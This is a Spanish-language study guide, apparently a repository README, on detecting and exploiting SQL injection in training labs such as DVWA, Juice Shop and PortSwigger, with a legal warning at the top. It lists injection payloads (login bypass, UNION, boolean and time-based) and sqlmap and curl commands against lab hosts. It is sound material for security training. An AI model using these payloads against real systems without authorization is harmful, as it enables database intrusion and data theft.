<div align="center">

# 💉 SQL Injection
### Detección, Confirmación y Explotación en Labs

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-SQL%20Injection-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **SQL Injection:** inyección de sentencias SQL en parámetros controlados para manipular o extraer datos de la base de datos subyacente.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Indicadores](#-indicadores) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 06 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 07 | [🧠 Casos Típicos](#-casos-típicos) |
| 08 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 09 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | SQL Injection, SQL Injection (Blind) |
| **Juice Shop** | Login Admin, Login Jim, Login Bender, Database Schema |
| **PortSwigger** | SQL injection learning path |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-sqlmap-ff3c6e?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `HTTP History`, `Replay`, `Automate` |
| **sqlmap** | Automatización y confirmación en labs |
| **curl** | Reproducción rápida fuera de proxy |
| **jq** | Parseo de respuestas JSON/API |

---

## 🔍 Indicadores

![Context](https://img.shields.io/badge/Detección-Señales-ff6b00?style=flat-square)

Señales de SQLi potencial:

- error SQL visible en response
- cambio de contenido con comilla simple `'`
- bypass de login con `' OR 1=1--`
- diferencia de contenido entre booleanos `1=1` vs `1=2`
- retraso temporal reproducible con `SLEEP(5)`
- respuesta válida con `UNION` de columnas correctas

> [!TIP]
> Probar siempre `'` sola primero. Un error de base de datos o comportamiento diferente es señal suficiente para continuar.

---

## 🧪 Payloads Base

### `[01]` Confirmación rápida

```text
'
"
')
'--
'#
```

### `[02]` Boolean-based

```text
' AND 1=1-- -
' AND 1=2-- -
' OR '1'='1-- -
```

### `[03]` Login bypass

```text
admin'-- -
' OR 1=1-- -
' OR '1'='1-- -
```

### `[04]` UNION — número de columnas

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

> [!NOTE]
> UNION requiere conocer el número exacto de columnas. Usar `ORDER BY` incremental hasta error, luego confirmar con `UNION SELECT NULL`.

### `[05]` Time-based

```text
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
'||(SELECT pg_sleep(5))-- -
```

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Buscar parámetros inyectables:

- filtros `category`, `id`, `product`
- campos `username` / `password`
- parámetros `search`, `q`
- cookies con valores enteros o strings

### `[02]` Replay manual

Probar en orden:

```text
'
' AND 1=1-- -
' AND 1=2-- -
```

Comparar: status, length, contenido del body.

### `[03]` Automatizar

Mandar a `Automate` con placeholder en parámetro vulnerable:

```text
'
' AND 1=1-- -
' AND 1=2-- -
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

### `[04]` Extraer comportamiento

Comparar en resultados de Automate:

- código HTTP
- longitud de respuesta
- palabras clave en body
- tiempo de respuesta

> [!IMPORTANT]
> Establecer baseline con request limpio antes de inyectar. La diferencia entre respuestas es la evidencia.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-sqlmap-ff3c6e?style=flat-square)

### sqlmap

```bash
# Básico sobre URL
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch

# Detectar bases de datos
sqlmap -u "http://target/search?q=test" -p q --batch --dbs

# Desde request guardado en Caido
sqlmap -r request.txt --batch --level 3 --risk 2

# Técnicas específicas
sqlmap -r request.txt -p id --technique=BEUSTQ --batch
```

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

### curl

```bash
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'&Submit=Submit#"
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'+AND+1=1--+-&Submit=Submit#"
```

---

## 🧠 Casos Típicos

| Caso | Qué mirar |
|------|-----------|
| **WHERE clause** | contenido cambia con booleanos |
| **Login** | respuesta 302 / sesión creada |
| **UNION** | número de columnas y columnas tipo texto |
| **Blind boolean** | palabras `Welcome`, `Invalid`, tamaños de respuesta |
| **Blind time** | delta estable en segundos |
| **OOB** | DNS/HTTP callback en infraestructura controlada |

---

## 🧭 Ruta de Práctica

1. DVWA SQLi básico
2. DVWA SQLi Blind
3. PortSwigger: hidden data WHERE clause
4. PortSwigger: login bypass
5. PortSwigger: UNION / número de columnas
6. PortSwigger: boolean blind
7. PortSwigger: time-based blind
8. Juice Shop: retos de login

---

## 📝 Checklist

- [ ] input controlado identificado
- [ ] comportamiento diferencial validado
- [ ] DBMS inferido
- [ ] técnica elegida: error / union / blind / time
- [ ] evidencia guardada en Caido
- [ ] reproducido solo en lab
